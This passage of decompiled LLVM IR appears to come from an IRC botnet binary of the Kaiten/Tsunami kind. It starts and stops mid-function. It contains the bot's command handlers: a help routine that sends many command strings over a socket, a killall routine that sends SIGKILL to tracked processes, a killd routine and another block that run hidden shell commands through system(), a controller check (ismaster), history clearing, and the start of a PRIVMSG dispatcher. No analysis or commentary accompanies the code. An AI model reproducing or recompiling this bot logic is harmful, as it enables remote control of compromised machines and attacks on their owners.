  store i32 %v3_8053e1f, i32* @edx, align 4
  %v3_8053e25 = load i32, i32* %v2_8053e25.pre-phi, align 4
  %v7_8053e28 = icmp ult i32 %v3_8053e1f, %v3_8053e25
  store i1 %v7_8053e28, i1* %cf.global-to-local, align 1
  %v1_8053e2a = icmp eq i1 %v7_8053e28, false
  br i1 %v1_8053e2a, label %dec_label_pc_8053e47, label %dec_label_pc_8053e2c

dec_label_pc_8053e2c:                             ; preds = %dec_label_pc_8053e1c
  %v3_8053e2f = load i32, i32* %v2_8053e1f.pre-phi, align 4
  store i32 %v3_8053e2f, i32* %edx.global-to-local, align 4
  %v0_8053e35 = load i32, i32* @ebp, align 4
  %v2_8053e35 = add nsw i32 %storemerge5104, -5188
  %v3_8053e35 = add i32 %v2_8053e35, %v0_8053e35
  %v4_8053e35 = inttoptr i32 %v3_8053e35 to i8*
  %v5_8053e35 = load i8, i8* %v4_8053e35, align 1
  %v3_8053e3c = inttoptr i32 %v3_8053e2f to i8*
  store i8 %v5_8053e35, i8* %v3_8053e3c, align 1
  %v0_8053e3e = load i32, i32* %edx.global-to-local, align 4
  %v1_8053e3e = add i32 %v0_8053e3e, 1
  store i32 %v1_8053e3e, i32* @edx, align 4
  store i32 %v1_8053e3e, i32* %v2_8053e1f.pre-phi, align 4
  br label %dec_label_pc_8053e85

dec_label_pc_8053e47:                             ; preds = %dec_label_pc_8053e1c
  %v0_8053e4a = load i32, i32* @ebp, align 4
  %v2_8053e4a = add nsw i32 %storemerge5104, -5188
  %v3_8053e4a = add i32 %v2_8053e4a, %v0_8053e4a
  %v4_8053e4a = inttoptr i32 %v3_8053e4a to i8*
  %v5_8053e4a = load i8, i8* %v4_8053e4a, align 1
  %v0_8053e56 = load i32, i32* @esp, align 4
  %v5_8053e56 = icmp ult i32 %v0_8053e56, 8
  store i1 %v5_8053e56, i1* %cf.global-to-local, align 1
  %v5_8053e5d = call i32 @putc_unlocked(i8 %v5_8053e4a, i32 %v4_8053c65)
  %v0_8053e62 = load i32, i32* @esp, align 4
  %v2_8053e62 = icmp ugt i32 %v0_8053e62, -17
  store i1 %v2_8053e62, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053e85

dec_label_pc_8053e67:                             ; preds = %dec_label_pc_8053e0c
  %v0_8053e6a = load i32, i32* @ebp, align 4
  %v2_8053e6a = add nsw i32 %storemerge5104, -5188
  %v3_8053e6a = add i32 %v2_8053e6a, %v0_8053e6a
  %v4_8053e6a = inttoptr i32 %v3_8053e6a to i8*
  %v5_8053e6a = load i8, i8* %v4_8053e6a, align 1
  %v0_8053e76 = load i32, i32* @esp, align 4
  %v5_8053e76 = icmp ult i32 %v0_8053e76, 8
  store i1 %v5_8053e76, i1* %cf.global-to-local, align 1
  %v5_8053e7d = call i32 @__GI_fputc(i8 %v5_8053e6a, i32 %v4_8053c65)
  %v0_8053e82 = load i32, i32* @esp, align 4
  %v2_8053e82 = icmp ugt i32 %v0_8053e82, -17
  store i1 %v2_8053e82, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053e85

dec_label_pc_8053e85:                             ; preds = %dec_label_pc_8053e47, %dec_label_pc_8053e2c, %dec_label_pc_8053e67
  %v4_8053e85 = add nuw nsw i32 %storemerge5104, 1
  %v10_8053e8b = icmp ult i32 %v4_8053e85, %v6_8053dda108
  store i1 %v10_8053e8b, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_8053e85, %v6_8053dda108
  br i1 %exitcond, label %dec_label_pc_8053dc9.loopexit, label %dec_label_pc_8053e0c

dec_label_pc_8053e99:                             ; preds = %dec_label_pc_8053dc9.loopexit, %dec_label_pc_8053dad
  store i1 %v5_80539ee, i1* %cf.global-to-local, align 1
  %tmp87 = inttoptr i32 %v4_8053c65 to i16*
  %v3_8053e9f = call i32 @__GI_fclose(i16* %tmp87)
  store i1 %v5_80539ee, i1* %cf.global-to-local, align 1
  %v2_8053ead = call i32 @close(i32 %v5_8053a33)
  %v2_8053ebb = load i32, i32* %v1_8053c5a, align 4
  store i32 %v2_8053ebb, i32* %edx.global-to-local, align 4
  store i1 %v5_8053c57, i1* %cf.global-to-local, align 1
  %v2_8053ecc = ptrtoint i32* %stack_var_-5447 to i32
  %v4_8053ed3 = call i32 @sprintf(i32 %v2_8053ecc, i32 ptrtoint ([21 x i8]* @global_var_806aa6b.501 to i32))
  store i1 %v5_80539ee, i1* %cf.global-to-local, align 1
  %v2_8053ee5 = call i32 @system(i32 %v2_8053ecc)
  store i1 %v5_8053be1, i1* %cf.global-to-local, align 1
  %v2_8053efe = ptrtoint i32* %stack_var_-5702 to i32
  %v4_8053f05 = call i32 @sprintf(i32 %v2_8053efe, i32 ptrtoint ([9 x i8]* @global_var_806aa80.502 to i32))
  store i1 %v5_80539ee, i1* %cf.global-to-local, align 1
  %v2_8053f17 = call i32 @system(i32 %v2_8053efe)
  store i1 %v5_8053be1, i1* %cf.global-to-local, align 1
  %v2_8053f30 = ptrtoint i32* %stack_var_-5957 to i32
  %v4_8053f37 = call i32 @sprintf(i32 %v2_8053f30, i32 ptrtoint ([22 x i8]* @global_var_806aa89.503 to i32))
  store i1 %v5_80539ee, i1* %cf.global-to-local, align 1
  %v2_8053f49 = call i32 @system(i32 %v2_8053f30)
  store i1 %v5_8053be1, i1* %cf.global-to-local, align 1
  %v2_8053f62 = ptrtoint i32* %stack_var_-6212 to i32
  %v4_8053f69 = call i32 @sprintf(i32 %v2_8053f62, i32 ptrtoint ([18 x i8]* @global_var_806aa9f.504 to i32))
  store i1 %v5_80539ee, i1* %cf.global-to-local, align 1
  %v2_8053f7b = call i32 @system(i32 %v2_8053f62)
  store i1 %v5_80539ee, i1* %cf.global-to-local, align 1
  %v2_8053f88 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8053f8d

dec_label_pc_8053f8d:                             ; preds = %entry, %dec_label_pc_8053e99
  %v0_8053f93 = phi i32 [ %v2_80539f4, %entry ], [ %v2_8053f88, %dec_label_pc_8053e99 ]
  ret i32 %v0_8053f93

; uselistorder directives
  uselistorder i32 %storemerge5104, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8053def, { 1, 0 }
  uselistorder i32 %v6_8053dda108, { 0, 4, 5, 6, 3, 1, 2 }
  uselistorder i32* %v2_8053e1f.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_8053d99, { 1, 0, 2 }
  uselistorder i32 %v4_8053d88, { 1, 2, 0 }
  uselistorder i32 %storemerge13.in117, { 0, 3, 2, 1 }
  uselistorder i1 %v0_8053cf2, { 1, 0 }
  uselistorder i32 %v7_8053cf0, { 1, 0 }
  uselistorder i32 %storemerge7126, { 2, 0, 3, 1 }
  uselistorder i32 %v4_8053c96, { 1, 0 }
  uselistorder i32 %v6_8053c81130, { 7, 8, 3, 0, 2, 1, 9, 10, 6, 4, 5 }
  uselistorder i32 %v2_8053c77, { 3, 1, 5, 2, 4, 0 }
  uselistorder i32 %v4_8053c65, { 10, 5, 6, 0, 1, 2, 3, 4, 8, 7, 9 }
  uselistorder i1 %v5_8053be1, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v2_8053b57, { 1, 0, 2 }
  uselistorder i32 %storemerge8, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8053af8.pre-phi, { 3, 0, 4, 2, 1 }
  uselistorder i1 %v0_8053a9b, { 1, 0 }
  uselistorder i32 %v5_8053a33, { 3, 4, 2, 5, 1, 6, 7, 0, 8 }
  uselistorder i32 %v4_8053a04, { 1, 0 }
  uselistorder i1 %v5_80539ee, { 6, 7, 8, 9, 10, 11, 1, 5, 4, 0, 12, 3, 2, 13 }
  uselistorder i32* %stack_var_-6252, { 3, 0, 1, 2, 6, 4, 5 }
  uselistorder i32* %stack_var_-1096, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0, 2 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 17, 11, 12, 13, 14, 15, 16, 70, 18, 19, 71, 20, 21, 32, 28, 22, 23, 24, 25, 26, 27, 72, 29, 30, 31, 73, 33, 34, 74, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69 }
  uselistorder i32 4095, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_8068a98.45 to i32), { 0, 2, 3, 1 }
  uselistorder i8 47, { 0, 2, 3, 1, 4 }
  uselistorder i32 -1092, { 2, 0, 3, 1 }
  uselistorder i32* inttoptr (i32 4 to i32*), { 14, 0, 1, 2, 15, 3, 4, 5, 6, 7, 8, 16, 17, 9, 18, 19, 10, 11, 12, 13 }
  uselistorder i32* inttoptr (i32 12 to i32*), { 3, 0, 4, 5, 1, 6, 2, 7, 8, 9 }
  uselistorder i32* inttoptr (i32 8 to i32*), { 3, 2, 4, 0, 1 }
  uselistorder i32 %arg4, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053f8d, { 1, 0 }
  uselistorder label %dec_label_pc_8053e85, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053def, { 1, 0 }
  uselistorder label %dec_label_pc_8053dad, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053d88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053d0f, { 1, 0 }
  uselistorder label %dec_label_pc_8053cb6, { 1, 0 }
  uselistorder label %dec_label_pc_8053c96, { 1, 0 }
  uselistorder label %dec_label_pc_8053c16, { 1, 0 }
  uselistorder label %dec_label_pc_8053bc8, { 1, 0 }
  uselistorder label %dec_label_pc_8053ba3, { 1, 0 }
  uselistorder label %dec_label_pc_8053af5, { 1, 0 }
  uselistorder label %dec_label_pc_8053ae9, { 1, 0 }
  uselistorder label %dec_label_pc_8053a64, { 1, 0 }
  uselistorder label %dec_label_pc_8053a2a, { 1, 0 }
}

define i32 @help(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8053fa0 = call i32 @mfork(i32 %arg2)
  %v1_8053fa8 = icmp eq i32 %v1_8053fa0, 0
  %v1_8053faa = icmp eq i1 %v1_8053fa8, false
  br i1 %v1_8053faa, label %dec_label_pc_805464a, label %dec_label_pc_8053fb0

dec_label_pc_8053fb0:                             ; preds = %entry
  %v3_8053fbe = call i32 @Send(i32 %arg1, i32 ptrtoint ([55 x i8]* @global_var_806aab4.505 to i32))
  %v1_8053fcb = call i32 @sleep(i32 3)
  %v3_8053fe1 = call i32 @Send(i32 %arg1, i32 ptrtoint ([69 x i8]* @global_var_806aaec.506 to i32))
  %v1_8053fee = call i32 @sleep(i32 1)
  %v3_8054004 = call i32 @Send(i32 %arg1, i32 ptrtoint ([84 x i8]* @global_var_806ab34.507 to i32))
  %v1_8054011 = call i32 @sleep(i32 1)
  %v3_8054027 = call i32 @Send(i32 %arg1, i32 ptrtoint ([84 x i8]* @global_var_806ab88.508 to i32))
  %v1_8054034 = call i32 @sleep(i32 1)
  %v3_805404a = call i32 @Send(i32 %arg1, i32 ptrtoint ([74 x i8]* @global_var_806abdc.509 to i32))
  %v1_8054057 = call i32 @sleep(i32 1)
  %v3_805406d = call i32 @Send(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_806ac28.510 to i32))
  %v1_805407a = call i32 @sleep(i32 1)
  %v3_8054090 = call i32 @Send(i32 %arg1, i32 ptrtoint ([143 x i8]* @global_var_806ac74.511 to i32))
  %v1_805409d = call i32 @sleep(i32 1)
  %v3_80540b3 = call i32 @Send(i32 %arg1, i32 ptrtoint ([105 x i8]* @global_var_806ad04.512 to i32))
  %v1_80540c0 = call i32 @sleep(i32 1)
  %v3_80540d6 = call i32 @Send(i32 %arg1, i32 ptrtoint ([60 x i8]* @global_var_806ad70.513 to i32))
  %v1_80540e3 = call i32 @sleep(i32 1)
  %v3_80540f9 = call i32 @Send(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_806adac.514 to i32))
  %v1_8054106 = call i32 @sleep(i32 3)
  %v3_805411c = call i32 @Send(i32 %arg1, i32 ptrtoint ([59 x i8]* @global_var_806add0.515 to i32))
  %v1_8054129 = call i32 @sleep(i32 1)
  %v3_805413f = call i32 @Send(i32 %arg1, i32 ptrtoint ([124 x i8]* @global_var_806ae0c.516 to i32))
  %v1_805414c = call i32 @sleep(i32 1)
  %v3_8054162 = call i32 @Send(i32 %arg1, i32 ptrtoint ([105 x i8]* @global_var_806ae88.517 to i32))
  %v1_805416f = call i32 @sleep(i32 1)
  %v3_8054185 = call i32 @Send(i32 %arg1, i32 ptrtoint ([166 x i8]* @global_var_806aef4.518 to i32))
  %v1_8054192 = call i32 @sleep(i32 1)
  %v3_80541a8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([95 x i8]* @global_var_806af9c.519 to i32))
  %v1_80541b5 = call i32 @sleep(i32 1)
  %v3_80541cb = call i32 @Send(i32 %arg1, i32 ptrtoint ([141 x i8]* @global_var_806affc.520 to i32))
  %v1_80541d8 = call i32 @sleep(i32 1)
  %v3_80541ee = call i32 @Send(i32 %arg1, i32 ptrtoint ([85 x i8]* @global_var_806b08c.521 to i32))
  %v1_80541fb = call i32 @sleep(i32 1)
  %v3_8054211 = call i32 @Send(i32 %arg1, i32 ptrtoint ([152 x i8]* @global_var_806b0e4.522 to i32))
  %v1_805421e = call i32 @sleep(i32 1)
  %v3_8054234 = call i32 @Send(i32 %arg1, i32 ptrtoint ([114 x i8]* @global_var_806b17c.523 to i32))
  %v1_8054241 = call i32 @sleep(i32 1)
  %v3_8054257 = call i32 @Send(i32 %arg1, i32 ptrtoint ([159 x i8]* @global_var_806b1f0.524 to i32))
  %v1_8054264 = call i32 @sleep(i32 1)
  %v3_805427a = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_806b28f.525 to i32))
  %v1_8054287 = call i32 @sleep(i32 3)
  %v3_805429d = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_806b2ac.526 to i32))
  %v1_80542aa = call i32 @sleep(i32 1)
  %v3_80542c0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([61 x i8]* @global_var_806b2e4.527 to i32))
  %v1_80542cd = call i32 @sleep(i32 1)
  %v3_80542e3 = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_806b324.528 to i32))
  %v1_80542f0 = call i32 @sleep(i32 1)
  %v3_8054306 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_806b358.529 to i32))
  %v1_8054313 = call i32 @sleep(i32 1)
  %v3_8054329 = call i32 @Send(i32 %arg1, i32 ptrtoint ([63 x i8]* @global_var_806b390.530 to i32))
  %v1_8054336 = call i32 @sleep(i32 1)
  %v3_805434c = call i32 @Send(i32 %arg1, i32 ptrtoint ([66 x i8]* @global_var_806b3d0.531 to i32))
  %v1_8054359 = call i32 @sleep(i32 1)
  %v3_805436f = call i32 @Send(i32 %arg1, i32 ptrtoint ([64 x i8]* @global_var_806b414.532 to i32))
  %v1_805437c = call i32 @sleep(i32 1)
  %v3_8054392 = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_806b454.533 to i32))
  %v1_805439f = call i32 @sleep(i32 1)
  %v3_80543b5 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_806b47c.534 to i32))
  %v1_80543c2 = call i32 @sleep(i32 1)
  %v3_80543d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([101 x i8]* @global_var_806b49c.535 to i32))
  %v1_80543e5 = call i32 @sleep(i32 1)
  %v3_80543fb = call i32 @Send(i32 %arg1, i32 ptrtoint ([66 x i8]* @global_var_806b504.536 to i32))
  %v1_8054408 = call i32 @sleep(i32 1)
  %v3_805441e = call i32 @Send(i32 %arg1, i32 ptrtoint ([108 x i8]* @global_var_806b548.537 to i32))
  %v1_805442b = call i32 @sleep(i32 1)
  %v3_8054441 = call i32 @Send(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_806b5b4.538 to i32))
  %v1_805444e = call i32 @sleep(i32 1)
  %v3_8054464 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_806b5ec.539 to i32))
  %v1_8054471 = call i32 @sleep(i32 1)
  %v3_8054487 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_806b624.540 to i32))
  %v1_8054494 = call i32 @sleep(i32 1)
  %v3_80544aa = call i32 @Send(i32 %arg1, i32 ptrtoint ([65 x i8]* @global_var_806b64c.541 to i32))
  %v1_80544b7 = call i32 @sleep(i32 1)
  %v3_80544cd = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_806b690.542 to i32))
  %v1_80544da = call i32 @sleep(i32 1)
  %v3_80544f0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([66 x i8]* @global_var_806b6c4.543 to i32))
  %v1_80544fd = call i32 @sleep(i32 1)
  %v3_8054513 = call i32 @Send(i32 %arg1, i32 ptrtoint ([69 x i8]* @global_var_806b708.544 to i32))
  %v1_8054520 = call i32 @sleep(i32 1)
  %v3_8054536 = call i32 @Send(i32 %arg1, i32 ptrtoint ([59 x i8]* @global_var_806b750.545 to i32))
  %v1_8054543 = call i32 @sleep(i32 1)
  %v3_8054559 = call i32 @Send(i32 %arg1, i32 ptrtoint ([92 x i8]* @global_var_806b78c.546 to i32))
  %v1_8054566 = call i32 @sleep(i32 1)
  %v3_805457c = call i32 @Send(i32 %arg1, i32 ptrtoint ([59 x i8]* @global_var_806b7e8.547 to i32))
  %v1_8054589 = call i32 @sleep(i32 1)
  %v3_805459f = call i32 @Send(i32 %arg1, i32 ptrtoint ([88 x i8]* @global_var_806b824.548 to i32))
  %v1_80545ac = call i32 @sleep(i32 1)
  %v3_80545c2 = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_806b87c.549 to i32))
  %v1_80545cf = call i32 @sleep(i32 1)
  %v3_80545e5 = call i32 @Send(i32 %arg1, i32 ptrtoint ([80 x i8]* @global_var_806b8dc.550 to i32))
  %v1_80545f2 = call i32 @sleep(i32 1)
  %v3_8054608 = call i32 @Send(i32 %arg1, i32 ptrtoint ([102 x i8]* @global_var_806b92c.551 to i32))
  %v1_8054615 = call i32 @sleep(i32 1)
  %v3_805462b = call i32 @Send(i32 %arg1, i32 ptrtoint ([111 x i8]* @global_var_806b994.552 to i32))
  %v1_8054638 = call i32 @sleep(i32 1)
  %v1_8054645 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_805464a

dec_label_pc_805464a:                             ; preds = %entry, %dec_label_pc_8053fb0
  %v0_805464b = phi i32 [ %v1_8053fa0, %entry ], [ %v1_8054645, %dec_label_pc_8053fb0 ]
  ret i32 %v0_805464b

; uselistorder directives
  uselistorder i32 %arg1, { 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805464a, { 1, 0 }
}

define i32 @killall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805464c = load i32, i32* @ebp, align 4
  store i32 %v0_805464c, i32* %stack_var_-4, align 4
  %v4_805464c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_805464c, i32* @ebp, align 4
  %v4_8054690 = icmp eq i32 %arg2, 0
  %v0_80546df14 = load i32, i32* @global_var_80748f4.31, align 4
  %v10_80546e416 = icmp eq i32 %v0_80546df14, 0
  br i1 %v10_80546e416, label %dec_label_pc_80546ed, label %dec_label_pc_805465f

dec_label_pc_805465f:                             ; preds = %entry, %dec_label_pc_80546dc
  %storemerge20 = phi i32 [ %v4_80546dc, %dec_label_pc_80546dc ], [ 0, %entry ]
  %v2_8054662 = mul i32 %storemerge20, 4
  %v0_8054667 = load i32, i32* @global_var_807e574.32, align 4
  %v2_805466c = add i32 %v0_8054667, %v2_8054662
  %v1_805466f = inttoptr i32 %v2_805466c to i32*
  %v2_805466f = load i32, i32* %v1_805466f, align 4
  %v1_8054671 = icmp eq i32 %v2_805466f, 0
  br i1 %v1_8054671, label %dec_label_pc_80546dc, label %dec_label_pc_8054675

dec_label_pc_8054675:                             ; preds = %dec_label_pc_805465f
  %v2_8054685 = load i32, i32* %v1_805466f, align 4
  store i32 %v2_8054685, i32* @ebx, align 4
  %v1_8054687 = call i32 @__libc_getpid(i32 %storemerge20)
  %v0_805468c = load i32, i32* @ebx, align 4
  %v12_805468c = icmp eq i32 %v0_805468c, %v1_8054687
  br i1 %v12_805468c, label %dec_label_pc_80546dc, label %dec_label_pc_8054690

dec_label_pc_8054690:                             ; preds = %dec_label_pc_8054675
  br i1 %v4_8054690, label %dec_label_pc_8054690.dec_label_pc_80546bc_crit_edge, label %dec_label_pc_8054696

dec_label_pc_8054690.dec_label_pc_80546bc_crit_edge: ; preds = %dec_label_pc_8054690
  br label %dec_label_pc_80546bc

dec_label_pc_8054696:                             ; preds = %dec_label_pc_8054690
  %v3_80546b4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_806ba03.553 to i32))
  br label %dec_label_pc_80546bc

dec_label_pc_80546bc:                             ; preds = %dec_label_pc_8054690.dec_label_pc_80546bc_crit_edge, %dec_label_pc_8054696
  %v0_80546c4 = load i32, i32* @global_var_807e574.32, align 4
  %v2_80546c9 = add i32 %v0_80546c4, %v2_8054662
  %v1_80546cc = inttoptr i32 %v2_80546c9 to i32*
  %v2_80546cc = load i32, i32* %v1_80546cc, align 4
  %v3_80546d4 = call i32 @kill(i32 %v2_80546cc, i32 9)
  br label %dec_label_pc_80546dc

dec_label_pc_80546dc:                             ; preds = %dec_label_pc_8054675, %dec_label_pc_805465f, %dec_label_pc_80546bc
  %v4_80546dc = add i32 %storemerge20, 1
  %v0_80546df = load i32, i32* @global_var_80748f4.31, align 4
  %v10_80546e4 = icmp ult i32 %v4_80546dc, %v0_80546df
  br i1 %v10_80546e4, label %dec_label_pc_805465f, label %dec_label_pc_80546df.dec_label_pc_80546ed_crit_edge

dec_label_pc_80546df.dec_label_pc_80546ed_crit_edge: ; preds = %dec_label_pc_80546dc
  br label %dec_label_pc_80546ed

dec_label_pc_80546ed:                             ; preds = %entry, %dec_label_pc_80546df.dec_label_pc_80546ed_crit_edge
  %v0_80546df.lcssa = phi i32 [ %v0_80546df, %dec_label_pc_80546df.dec_label_pc_80546ed_crit_edge ], [ 0, %entry ]
  ret i32 %v0_80546df.lcssa

; uselistorder directives
  uselistorder i32 %v4_80546dc, { 1, 0 }
  uselistorder i32 %v2_8054662, { 1, 0 }
  uselistorder i32 %storemerge20, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_80546ed, { 1, 0 }
  uselistorder label %dec_label_pc_80546dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80546bc, { 1, 0 }
  uselistorder label %dec_label_pc_805465f, { 1, 0 }
}

define i32 @killd() local_unnamed_addr {
entry:
  %stack_var_-1028 = alloca i32, align 4
  %v2_80546fb = ptrtoint i32* %stack_var_-1028 to i32
  %v4_805470d = bitcast i32* %stack_var_-1028 to i8*
  %v5_805470d = call i32 @__GI_memset(i8* %v4_805470d, i32 0, i32 1024)
  %v0_8054715 = load i8, i8* @global_var_80748e8.28, align 8
  %v1_8054715 = zext i8 %v0_8054715 to i32
  %v3_8054715 = and i32 %v5_805470d, -256
  %v4_8054715 = or i32 %v1_8054715, %v3_8054715
  %v10_805471a = icmp eq i8 %v0_8054715, 1
  br i1 %v10_805471a, label %dec_label_pc_8054757, label %dec_label_pc_805471e

dec_label_pc_805471e:                             ; preds = %entry
  %v3_8054733 = call i32 @sprintf(i32 %v2_80546fb, i32 ptrtoint ([21 x i8]* @global_var_806ba1f.555 to i32))
  %v1_8054745 = call i32 @system(i32 %v2_80546fb)
  %v1_8054752 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8054757

dec_label_pc_8054757:                             ; preds = %entry, %dec_label_pc_805471e
  %v0_8054758 = phi i32 [ %v4_8054715, %entry ], [ %v1_8054752, %dec_label_pc_805471e ]
  ret i32 %v0_8054758

; uselistorder directives
  uselistorder i32 (i32)* @system, { 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054757, { 1, 0 }
}

define i32 @append(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054759 = load i32, i32* @ebp, align 4
  store i32 %v0_8054759, i32* %stack_var_-4, align 4
  %v4_8054759 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8054759, i32* @ebp, align 4
  store i32 0, i32* %stack_var_-8, align 4
  %v2_8054771 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8054775 = call i32 @__GI_asprintf(i32 %v2_8054771, i32 ptrtoint ([5 x i8]* @global_var_806ba34.556 to i32), i32 %arg1, i32 %arg2)
  %v3_805477d = load i32, i32* %stack_var_-8, align 4
  %v2_8054780 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054780, i32* @ebp, align 4
  ret i32 %v3_805477d

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 1 }
}

define i32 @ismaster(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp8 = ptrtoint i32* %arg2 to i32
  %v5_80547f123 = icmp sgt i32 %arg3, 0
  br i1 %v5_80547f123, label %dec_label_pc_8054792.lr.ph, label %dec_label_pc_80547fa

dec_label_pc_8054792.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8054792

dec_label_pc_8054792:                             ; preds = %dec_label_pc_8054792.lr.ph, %dec_label_pc_80547e8
  %storemerge124 = phi i32 [ 0, %dec_label_pc_8054792.lr.ph ], [ %v4_80547e8, %dec_label_pc_80547e8 ]
  %v2_8054795 = mul i32 %storemerge124, 4
  %v5_8054798 = add i32 %v2_8054795, %tmp8
  %v1_805479b = inttoptr i32 %v5_8054798 to i32*
  %v2_805479b = load i32, i32* %v1_805479b, align 4
  %v2_80547a6 = call i32 @append(i32 %v2_805479b, i32 ptrtoint (i32* @global_var_806ba39.557 to i32))
  store i1 false, i1* @df, align 1
  %v4_80547bf = inttoptr i32 %v2_80547a6 to i8*
  store i32 %v2_80547a6, i32* @edi, align 4
  %v3_80547c2 = call i32 @_strlen(i8* %v4_80547bf)
  store i32 %v3_80547c2, i32* @eax, align 4
  %v4_80547d3 = call i32 @__GI_strncmp(i8* %v4_80547bf, i32 %arg1, i32 %v3_80547c2)
  %v1_80547db = icmp eq i32 %v4_80547d3, 0
  %v1_80547dd = icmp eq i1 %v1_80547db, false
  br i1 %v1_80547dd, label %dec_label_pc_80547e8, label %dec_label_pc_80547fa

dec_label_pc_80547e8:                             ; preds = %dec_label_pc_8054792
  %v4_80547e8 = add nuw nsw i32 %storemerge124, 1
  %v5_80547f1 = icmp slt i32 %v4_80547e8, %arg3
  br i1 %v5_80547f1, label %dec_label_pc_8054792, label %dec_label_pc_80547fa

dec_label_pc_80547fa:                             ; preds = %dec_label_pc_8054792, %dec_label_pc_80547e8, %entry
  %storemerge = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_80547e8 ], [ 1, %dec_label_pc_8054792 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_80547c2, { 1, 0 }
  uselistorder i32 %v2_80547a6, { 1, 0 }
  uselistorder i32 %storemerge124, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80547fa, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054792, { 1, 0 }
}

define i32 @histClear(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8054802 = load i32, i32* @ebp, align 4
  store i32 %v0_8054802, i32* %stack_var_-4, align 4
  %v4_8054802 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8054802, i32* @ebp, align 4
  %v0_8054808 = call i32 @ClearHistory()
  %v3_805481b = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_806ba3b.558 to i32))
  ret i32 %v3_805481b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %tmp112 = inttoptr i32 %arg3 to i8*
  %stack_var_-2168 = alloca i32, align 4
  %stack_var_-1144 = alloca i32, align 4
  %v0_8054830 = load i32, i32* @global_var_806f8ac.559, align 4
  %v4_805483e = ptrtoint i8* %arg2 to i32
  %v5_8054841 = call i32 @ismaster(i32 %v4_805483e, i32* bitcast ([2 x i8*]* @global_var_806f8b0.562 to i32*), i32 %v0_8054830)
  %v1_8054849 = icmp eq i32 %v5_8054841, 0
  br i1 %v1_8054849, label %dec_label_pc_805564f, label %dec_label_pc_805485d.preheader

dec_label_pc_805485d.preheader:                   ; preds = %entry
